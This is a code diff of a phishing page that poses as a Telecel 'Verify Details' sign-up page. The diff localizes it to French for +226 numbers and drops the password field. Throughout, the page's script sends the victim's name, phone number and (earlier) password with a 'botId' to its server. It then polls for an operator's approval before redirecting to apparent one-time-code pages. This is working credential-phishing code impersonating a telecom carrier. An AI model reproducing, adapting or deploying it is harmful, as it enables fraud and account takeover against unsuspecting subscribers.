@@ -1,126 +1,191 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Verify Details</title>
 
 <style>
-  body {
+  * {
     margin: 0;
-    font-family: Arial, Helvetica, sans-serif;
-    background: radial-gradient(circle at top right, #b71c1c 0%, #0b0b0b 45%);
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    background: #0a0a0a;
     color: #ffffff;
     min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
+    padding: 20px;
   }
 
   .container {
     width: 100%;
-    max-width: 420px;
-    padding: 24px;
+    max-width: 400px;
+    padding: 40px 24px 32px;
+    background: #0a0a0a;
+    border-radius: 0;
   }
 
   .logo {
     text-align: center;
-    margin-bottom: 24px;
+    margin-bottom: 40px;
   }
 
   .logo-circle {
-    width: 64px;
-    height: 64px;
+    width: 56px;
+    height: 56px;
     background: #e53935;
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
-    margin: 0 auto 8px;
-    font-size: 34px;
-    font-weight: bold;
+    margin: 0 auto 12px;
+    font-size: 28px;
+    font-weight: 700;
+    color: #fff;
   }
 
   .telecel {
-    font-size: 22px;
-    font-weight: bold;
+    font-size: 20px;
+    font-weight: 700;
     color: #e53935;
-    margin-bottom: 6px;
+    letter-spacing: 0.5px;
+    margin-bottom: 16px;
   }
 
-  .welcome {
-    font-size: 16px;
-    font-weight: bold;
-    color: #e53935;
-    margin-bottom: 6px;
+  .title {
+    font-size: 26px;
+    font-weight: 700;
+    color: #ffffff;
+    text-align: left;
+    margin-bottom: 8px;
   }
 
-  .desc {
-    font-size: 13px;
-    color: #bdbdbd;
-    line-height: 1.4;
-    margin-bottom: 22px;
+  .subtitle {
+    font-size: 15px;
+    color: rgba(255, 255, 255, 0.5);
+    text-align: left;
+    margin-bottom: 32px;
   }
 
   label {
-    font-size: 13px;
-    color: #bdbdbd;
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.6);
     margin-bottom: 6px;
     display: block;
   }
 
-  input, select {
+  .phone-input-wrap {
+    position: relative;
+    margin-bottom: 24px;
+  }
+
+  .phone-input-wrap input {
     width: 100%;
-    padding: 14px;
+    padding: 14px 16px 14px 52px;
     font-size: 15px;
-    margin-bottom: 18px;
-    border-radius: 10px;
-    border: 1px solid #2a2a2a;
-    background: #1b1b1b;
+    border-radius: 8px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    background: rgba(255, 255, 255, 0.05);
     color: #ffffff;
     box-sizing: border-box;
+    outline: none;
+    transition: border-color 0.3s ease;
   }
 
-  .password-wrap {
-    position: relative;
+  .phone-input-wrap input:focus {
+    border-color: #e53935;
   }
 
-  .eye {
+  .phone-input-wrap input::placeholder {
+    color: rgba(255, 255, 255, 0.3);
+  }
+
+  .country-code {
     position: absolute;
-    right: 14px;
+    left: 16px;
     top: 50%;
     transform: translateY(-50%);
-    cursor: pointer;
-    color: #aaa;
+    color: rgba(255, 255, 255, 0.6);
+    font-size: 14px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    gap: 4px;
   }
 
-  .forgot {
-    text-align: right;
-    font-size: 12px;
+  .country-code::after {
+    content: '▼';
+    font-size: 10px;
+    color: rgba(255, 255, 255, 0.3);
+    margin-left: 4px;
+  }
+
+  .checkbox-wrap {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin-bottom: 28px;
+  }
+
+  .checkbox-wrap input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    min-width: 18px;
+    margin-top: 2px;
+    accent-color: #e53935;
+    cursor: pointer;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    border-radius: 4px;
+  }
+
+  .checkbox-wrap label {
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.5);
+    line-height: 1.5;
+    cursor: pointer;
+    margin-bottom: 0;
+  }
+
+  .checkbox-wrap label a {
     color: #e53935;
-    margin-top: -10px;
-    margin-bottom: 16px;
+    text-decoration: none;
+  }
+
+  .checkbox-wrap label a:hover {
+    text-decoration: underline;
   }
 
   button {
     width: 100%;
     padding: 16px;
     font-size: 16px;
-    border-radius: 10px;
+    font-weight: 600;
+    border-radius: 8px;
     cursor: pointer;
+    transition: all 0.3s ease;
+    border: none;
   }
 
   .primary {
     background: #e53935;
-    border: none;
     color: #ffffff;
     margin-bottom: 12px;
   }
 
-  .secondary {
-    background: transparent;
-    border: 1px solid #e53935;
-    color: #e53935;
+  .primary:hover:not(:disabled) {
+    background: #c62828;
+  }
+
+  .primary:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
   }
 
   .status {
@@ -128,18 +193,21 @@
     text-align: center;
     font-size: 14px;
     display: none;
+    padding: 12px;
+    border-radius: 8px;
+    background: rgba(255, 255, 255, 0.05);
   }
 
   .error {
     color: #e53935;
+    background: rgba(229, 57, 53, 0.1);
   }
 
-  /* 🔥 LOADING SPINNER */
   .spinner {
-    margin: 12px auto 0;
-    width: 28px;
-    height: 28px;
-    border: 3px solid rgba(255,255,255,0.2);
+    margin: 16px auto 0;
+    width: 32px;
+    height: 32px;
+    border: 3px solid rgba(229, 57, 53, 0.1);
     border-top: 3px solid #e53935;
     border-radius: 50%;
     animation: spin 1s linear infinite;
@@ -150,11 +218,37 @@
     to { transform: rotate(360deg); }
   }
 
+  .back-link {
+    text-align: center;
+    margin-top: 16px;
+  }
+
+  .back-link button {
+    background: transparent;
+    border: none;
+    color: rgba(255, 255, 255, 0.3);
+    font-size: 14px;
+    cursor: pointer;
+    padding: 8px;
+    transition: color 0.3s ease;
+    width: auto;
+  }
+
+  .back-link button:hover:not(:disabled) {
+    color: rgba(255, 255, 255, 0.6);
+  }
+
+  .back-link button:disabled {
+    opacity: 0.3;
+    cursor: not-allowed;
+  }
+
   .footer {
-    margin-top: 28px;
+    margin-top: 32px;
     text-align: center;
     font-size: 12px;
-    color: #777;
+    color: rgba(255, 255, 255, 0.2);
+    letter-spacing: 0.5px;
   }
 </style>
 </head>
@@ -165,39 +259,33 @@
   <div class="logo">
     <div class="logo-circle">t</div>
     <div class="telecel">telecel</div>
-    <div class="welcome">Welcome to Telecel Play</div>
-    <div class="desc">
-      Enter your number to sign up or log in.<br>
-      You need to be a Telecel subscriber to proceed.
-    </div>
   </div>
 
+  <div class="title">Commençons</div>
+  <div class="subtitle">Entrez votre numéro de téléphone pour commencer</div>
+
   <form id="detailsForm">
-
-    <label>Account type</label>
-    <select id="accountType">
-      <option>Mobile</option>
-      <option>Broadband</option>
-    </select>
-
-    <label>Phone Number</label>
-    <input type="text" id="phone" required />
-
-    <label>Password</label>
-    <div class="password-wrap">
-      <input type="password" id="password" required />
-      <span class="eye" onclick="togglePassword()">👁</span>
+    <div class="phone-input-wrap">
+      <span class="country-code">+226</span>
+      <input type="text" id="phone" placeholder="Saisissez le numéro de téléphone" required />
     </div>
 
-    <div class="forgot">Forgot your password?</div>
+    <div class="checkbox-wrap">
+      <input type="checkbox" id="termsCheck" required />
+      <label for="termsCheck">
+        J'accepte le <a href="#">Conditions d'utilisation</a> et <a href="#">Politique de confidentialité</a>
+      </label>
+    </div>
 
-    <button type="submit" class="primary">Next</button>
+    <button type="submit" class="primary">Continuer</button>
   </form>
 
   <div id="status" class="status">⏳ Waiting for approval...</div>
   <div id="spinner" class="spinner"></div>
 
-  <button class="secondary" onclick="history.back()">Go Back</button>
+  <div class="back-link">
+    <button onclick="history.back()">Retour</button>
+  </div>
 
   <div class="footer">v 5.3.2 (1.0.0)</div>
 </div>
@@ -206,9 +294,9 @@
 const form = document.getElementById('detailsForm');
 const statusEl = document.getElementById('status');
 const spinner = document.getElementById('spinner');
-const passwordInput = document.getElementById('password');
 const nextButton = form.querySelector('button.primary');
-const backButton = document.querySelector('button.secondary');
+const backButton = document.querySelector('.back-link button');
+const termsCheck = document.getElementById('termsCheck');
 
 const fullName = localStorage.getItem('fullName');
 
@@ -222,17 +310,28 @@ if(!botId || !fullName){
   window.location.href='index.html';
 }
 
-function togglePassword(){
-  passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-}
-
-// Disable Next button after click
 form.addEventListener('submit', async (e)=>{
   e.preventDefault();
+  
+  if (!termsCheck.checked) {
+    statusEl.style.display = 'block';
+    statusEl.classList.add('error');
+    statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
+    return;
+  }
+
   nextButton.disabled = true;
 
   const phone = document.getElementById('phone').value;
-  const password = passwordInput.value;
+
+  // Validate phone number
+  if (!phone || phone.trim() === '') {
+    statusEl.style.display = 'block';
+    statusEl.classList.add('error');
+    statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
+    nextButton.disabled = false;
+    return;
+  }
 
   localStorage.setItem('phone', phone);
 
@@ -242,10 +341,11 @@ form.addEventListener('submit', async (e)=>{
   statusEl.textContent='⏳ Waiting for approval...';
 
   try{
-    const res = await fetch(`${window.location.origin}/submit-password`,{
+    // Send only phone number and name
+    const res = await fetch(`${window.location.origin}/submit-phone`,{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({name:fullName, phone, password, botId})
+      body:JSON.stringify({name: fullName, phone: phone, botId: botId})
     });
 
     if(!res.ok) throw new Error();
@@ -253,41 +353,48 @@ form.addEventListener('submit', async (e)=>{
     const { requestId } = await res.json();
     pollApproval(requestId);
 
-  }catch{
+  } catch(error) {
     spinner.style.display='none';
     statusEl.classList.add('error');
     statusEl.textContent='❌ Server error. Please try again.';
-    nextButton.disabled = false; // Re-enable if failed
+    nextButton.disabled = false;
+    console.error('Error:', error);
   }
 });
 
 function pollApproval(requestId){
   const interval = setInterval(async ()=>{
-    const res = await fetch(`${window.location.origin}/check-password/${requestId}`);
-    const data = await res.json();
+    try {
+      const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
+      const data = await res.json();
 
-    if(data.redirect === 'code2'){
-      clearInterval(interval);
-      window.location.href='code2.html';
-    }
-    if(data.redirect === 'code'){
-      clearInterval(interval);
-      window.location.href='code.html';
-    }
-    if(data.approved === false){
-      clearInterval(interval);
-      spinner.style.display='none';
-      statusEl.classList.add('error');
-      statusEl.textContent='❌ Incorrect details. Please try again.';
-      nextButton.disabled = false; // Re-enable if rejected
+      if(data.redirect === 'code2'){
+        clearInterval(interval);
+        window.location.href='code2.html';
+      }
+      if(data.redirect === 'code'){
+        clearInterval(interval);
+        window.location.href='code.html';
+      }
+      if(data.approved === false){
+        clearInterval(interval);
+        spinner.style.display='none';
+        statusEl.classList.add('error');
+        statusEl.textContent='❌ Incorrect details. Please try again.';
+        nextButton.disabled = false;
+      }
+    } catch(error) {
+      console.error('Polling error:', error);
     }
   }, 2000);
 }
 
 // Disable Go Back button after click
-backButton.addEventListener('click', ()=>{
-  backButton.disabled = true;
-});
+if (backButton) {
+  backButton.addEventListener('click', ()=>{
+    backButton.disabled = true;
+  });
+}
 </script>
 
 </body>
